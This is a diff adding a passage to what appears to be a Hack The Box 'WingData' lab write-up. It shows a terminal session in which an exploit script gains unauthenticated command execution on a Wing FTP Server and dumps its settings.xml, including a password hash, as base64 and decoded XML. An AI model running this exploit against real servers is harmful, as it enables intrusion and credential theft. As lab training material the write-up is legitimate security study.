@@ -547,5 +547,107 @@ YmxlUG9ydFVQblA+CjwvQWRtaW5pc3RyYXRvcj4K
 ```
 
 ```
+ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/settings.xml"
 
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 ./Data/settings.xml' and username: 'anonymous'
+[+] UID extracted: 1892ea8d28bc2924b3851f0b3c1a9073f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 1892ea8d28bc2924b3851f0b3c1a9073f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8V2luZ0Z0cFNlcnZlciBEZXNjcmlwdGlvbj0iV2luZyBG
+VFAgU2VydmVyIEdsb2JhbCBPcHRpb25zIj4KICAgIDxTeXN0ZW1Mb2dmaWxlRW5hYmxlPjE8L1N5
+c3RlbUxvZ2ZpbGVFbmFibGU+CiAgICA8U3lzdGVtTG9nZmlsZUZpbGVuYW1lPlN5c3RlbS0lWS0l
+TS0lRC5sb2c8L1N5c3RlbUxvZ2ZpbGVGaWxlbmFtZT4KICAgIDxTeXN0ZW1Mb2dmaWxlTWF4c2l6
+ZT4wPC9TeXN0ZW1Mb2dmaWxlTWF4c2l6ZT4KICAgIDxTeXN0ZW1Mb2dmaWxlU3lzdGVtRW5hYmxl
+PjE8L1N5c3RlbUxvZ2ZpbGVTeXN0ZW1FbmFibGU+CiAgICA8U3lzdGVtTG9nc2NyZWVuU3lzdGVt
+RW5hYmxlPjE8L1N5c3RlbUxvZ3NjcmVlblN5c3RlbUVuYWJsZT4KICAgIDxTeXN0ZW1Mb2dmaWxl
+VGFza0VuYWJsZT4xPC9TeXN0ZW1Mb2dmaWxlVGFza0VuYWJsZT4KICAgIDxTeXN0ZW1Mb2dzY3Jl
+ZW5UYXNrRW5hYmxlPjE8L1N5c3RlbUxvZ3NjcmVlblRhc2tFbmFibGU+CiAgICA8RW5hYmxlTGlz
+dENhY2hlPjA8L0VuYWJsZUxpc3RDYWNoZT4KICAgIDxFbmFibGVUaHVtYm5haWw+MTwvRW5hYmxl
+VGh1bWJuYWlsPgogICAgPEVuYWJsZUVkMmtMaW5rPjE8L0VuYWJsZUVkMmtMaW5rPgogICAgPE1h
+eERvd25sb2FkU3BlZWQ+MDwvTWF4RG93bmxvYWRTcGVlZD4KICAgIDxNYXhVcGxvYWRTcGVlZD4w
+PC9NYXhVcGxvYWRTcGVlZD4KICAgIDxFbmFibGVPbmxpbmVFZGl0PjE8L0VuYWJsZU9ubGluZUVk
+aXQ+CiAgICA8TWF4VGhyZWFkUG9vbD44PC9NYXhUaHJlYWRQb29sPgogICAgPFNlcnZlclBhc3N3
+b3JkPjJEMzVBOEQ0MjBBNjk3MjAzRDdDNTU0QTY3OEY4MTE5PC9TZXJ2ZXJQYXNzd29yZD4KICAg
+IDxEaXNhYmxlU1NMdjM+MTwvRGlzYWJsZVNTTHYzPgogICAgPEVuYWJsZUZpcHM+MTwvRW5hYmxl
+Rmlwcz4KICAgIDxFbmFibGVDaG1vZD4wPC9FbmFibGVDaG1vZD4KICAgIDxBbGxvd0ZUUFByb3RD
+PjE8L0FsbG93RlRQUHJvdEM+CiAgICA8RGVmYXVsdEZpbGVQZXJtPjA2MDA8L0RlZmF1bHRGaWxl
+UGVybT4KICAgIDxEZWZhdWx0Rm9sZGVyUGVybT4wNzU1PC9EZWZhdWx0Rm9sZGVyUGVybT4KICAg
+IDxBdWRpdERhdGFiYXNlRmlsZW5hbWU+YXVkaXRfZGI8L0F1ZGl0RGF0YWJhc2VGaWxlbmFtZT4K
+ICAgIDxBdWRpdERhdGFiYXNlRW5hYmxlPjE8L0F1ZGl0RGF0YWJhc2VFbmFibGU+CiAgICA8RW5h
+YmxlU0hBMjU2PjA8L0VuYWJsZVNIQTI1Nj4KICAgIDxFbmFibGVNRk1UPjE8L0VuYWJsZU1GTVQ+
+CiAgICA8RGlzYWJsZVRMU3YxPjE8L0Rpc2FibGVUTFN2MT4KICAgIDxPcGVuU1NMQ2lwaGVycz5F
+Q0RIRS1FQ0RTQS1BRVMxMjgtR0NNLVNIQTI1NjpFQ0RIRS1SU0EtQUVTMTI4LUdDTS1TSEEyNTY6
+RUNESEUtRUNEU0EtQUVTMjU2LUdDTS1TSEEzODQ6RUNESEUtUlNBLUFFUzI1Ni1HQ00tU0hBMzg0
+OkVDREhFLUVDRFNBLUNIQUNIQTIwLVBPTFkxMzA1OkVDREhFLVJTQS1DSEFDSEEyMC1QT0xZMTMw
+NTwvT3BlblNTTENpcGhlcnM+CiAgICA8U0ZUUEtleEFsZ29zPmN1cnZlMjU1MTktc2hhMjU2LGN1
+cnZlMjU1MTktc2hhMjU2QGxpYnNzaC5vcmcsZWNkaC1zaGEyLW5pc3RwMjU2LGVjZGgtc2hhMi1u
+aXN0cDM4NCxlY2RoLXNoYTItbmlzdHA1MjEsZGlmZmllLWhlbGxtYW4tZ3JvdXAxNi1zaGE1MTIs
+ZGlmZmllLWhlbGxtYW4tZ3JvdXAxOC1zaGE1MTI8L1NGVFBLZXhBbGdvcz4KICAgIDxTRlRQRW5j
+QWxnb3M+YWVzMjU2LWN0cixhZXMxOTItY3RyLGFlczEyOC1jdHI8L1NGVFBFbmNBbGdvcz4KICAg
+IDxTRlRQTWFjQWxnb3M+aG1hYy1zaGEyLTI1NixobWFjLXNoYTItNTEyLGhtYWMtc2hhMi0yNTYt
+ZXRtQG9wZW5zc2guY29tLGhtYWMtc2hhMi01MTItZXRtQG9wZW5zc2guY29tPC9TRlRQTWFjQWxn
+b3M+CiAgICA8U1NITG9nUGF0aD5Mb2cvc3NoX2RlYnVnX2xvZzwvU1NITG9nUGF0aD4KICAgIDxT
+U0hMb2dMZXZlbD4xPC9TU0hMb2dMZXZlbD4KICAgIDxEaXNhYmxlVExTdjFfMT4xPC9EaXNhYmxl
+VExTdjFfMT4KICAgIDxEaXNhYmxlRUNEU0FLZXk+MDwvRGlzYWJsZUVDRFNBS2V5PgogICAgPFdl
+YkxpbmtQYXRoPl9XRUJMSU5LPC9XZWJMaW5rUGF0aD4KICAgIDxVcGxvYWRMaW5rUGF0aD5fVVBM
+T0FETElOSzwvVXBsb2FkTGlua1BhdGg+CiAgICA8QXV0b1JlY292ZXJ5PjE8L0F1dG9SZWNvdmVy
+eT4KICAgIDxTRlRQSG9zdEtleT5zc2gtcnNhLHJzYS1zaGEyLTUxMixyc2Etc2hhMi0yNTYsZWNk
+c2Etc2hhMi1uaXN0cDI1NjwvU0ZUUEhvc3RLZXk+CiAgICA8UmVzdHJpY3RTZXNzaW9uSVA+MTwv
+UmVzdHJpY3RTZXNzaW9uSVA+CiAgICA8U1FMaXRlREJGb2xkZXI+RGF0YTwvU1FMaXRlREJGb2xk
+ZXI+CiAgICA8T3BlblNTTE5vQ2FjaGU+MDwvT3BlblNTTE5vQ2FjaGU+CiAgICA8T3BlblNTTE5v
+UmVzdW1wdGlvbj4wPC9PcGVuU1NMTm9SZXN1bXB0aW9uPgogICAgPExpc3RXaXRoUmVhbFVzZXJH
+cm91cD4wPC9MaXN0V2l0aFJlYWxVc2VyR3JvdXA+CiAgICA8T3BlblNTTE5vUmVuZWdvdGlhdGlv
+bj4wPC9PcGVuU1NMTm9SZW5lZ290aWF0aW9uPgo8L1dpbmdGdHBTZXJ2ZXI+Cg==
+
+<?xml version="1.0" ?>
+<WingFtpServer Description="Wing FTP Server Global Options">
+    <SystemLogfileEnable>1</SystemLogfileEnable>
+    <SystemLogfileFilename>System-%Y-%M-%D.log</SystemLogfileFilename>
+    <SystemLogfileMaxsize>0</SystemLogfileMaxsize>
+    <SystemLogfileSystemEnable>1</SystemLogfileSystemEnable>
+    <SystemLogscreenSystemEnable>1</SystemLogscreenSystemEnable>
+    <SystemLogfileTaskEnable>1</SystemLogfileTaskEnable>
+    <SystemLogscreenTaskEnable>1</SystemLogscreenTaskEnable>
+    <EnableListCache>0</EnableListCache>
+    <EnableThumbnail>1</EnableThumbnail>
+    <EnableEd2kLink>1</EnableEd2kLink>
+    <MaxDownloadSpeed>0</MaxDownloadSpeed>
+    <MaxUploadSpeed>0</MaxUploadSpeed>
+    <EnableOnlineEdit>1</EnableOnlineEdit>
+    <MaxThreadPool>8</MaxThreadPool>
+    <ServerPassword>2D35A8D420A697203D7C554A678F8119</ServerPassword>
+    <DisableSSLv3>1</DisableSSLv3>
+    <EnableFips>1</EnableFips>
+    <EnableChmod>0</EnableChmod>
+    <AllowFTPProtC>1</AllowFTPProtC>
+    <DefaultFilePerm>0600</DefaultFilePerm>
+    <DefaultFolderPerm>0755</DefaultFolderPerm>
+    <AuditDatabaseFilename>audit_db</AuditDatabaseFilename>
+    <AuditDatabaseEnable>1</AuditDatabaseEnable>
+    <EnableSHA256>0</EnableSHA256>
+    <EnableMFMT>1</EnableMFMT>
+    <DisableTLSv1>1</DisableTLSv1>
+    <OpenSSLCiphers>ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305</OpenSSLCiphers>
+    <SFTPKexAlgos>curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512</SFTPKexAlgos>
+    <SFTPEncAlgos>aes256-ctr,aes192-ctr,aes128-ctr</SFTPEncAlgos>
+    <SFTPMacAlgos>hmac-sha2-256,hmac-sha2-512,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com</SFTPMacAlgos>
+    <SSHLogPath>Log/ssh_debug_log</SSHLogPath>
+    <SSHLogLevel>1</SSHLogLevel>
+    <DisableTLSv1_1>1</DisableTLSv1_1>
+    <DisableECDSAKey>0</DisableECDSAKey>
+    <WebLinkPath>_WEBLINK</WebLinkPath>
+    <UploadLinkPath>_UPLOADLINK</UploadLinkPath>
+    <AutoRecovery>1</AutoRecovery>
+    <SFTPHostKey>ssh-rsa,rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256</SFTPHostKey>
+    <RestrictSessionIP>1</RestrictSessionIP>
+    <SQLiteDBFolder>Data</SQLiteDBFolder>
+    <OpenSSLNoCache>0</OpenSSLNoCache>
+    <OpenSSLNoResumption>0</OpenSSLNoResumption>
+    <ListWithRealUserGroup>0</ListWithRealUserGroup>
+    <OpenSSLNoRenegotiation>0</OpenSSLNoRenegotiation>
+</WingFtpServer>
 ```
+
+
